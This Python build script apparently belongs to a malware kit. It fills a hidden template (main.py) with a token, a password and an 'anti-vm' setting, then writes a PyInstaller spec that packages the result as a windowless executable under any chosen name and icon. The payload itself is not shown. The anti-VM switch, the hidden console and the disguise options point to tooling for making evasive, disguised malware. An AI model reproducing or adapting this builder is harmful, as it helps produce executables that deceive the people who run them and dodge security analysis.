import json
import os

with open('config.json', 'r') as config_file:
    config = json.load(config_file)

with open('main.py', 'r', encoding='utf-8') as template_file:
    template_content = template_file.read()

template_content = template_content.replace("{{token}}", config['token'])
template_content = template_content.replace("{{members}}", config['members'])
template_content = template_content.replace("{{vm}}", config['anti-vm'])
template_content = template_content.replace("{{password}}", config['password'])

with open('script.py', 'w', encoding='utf-8') as final_file:
    final_file.write(template_content)

spec_content = f"""
# -*- mode: python ; coding: utf-8 -*-

a = Analysis(
    ['script.py'],
    pathex=[],
    binaries=[],
    datas=[('{config['app_logo']}', '.')],
    hiddenimports=['comtypes'],
    hookspath=[],
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='{config['app_name']}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='{config['app_logo']}'
)
"""

with open('script.spec', 'w') as spec_file:
    spec_file.write(spec_content)
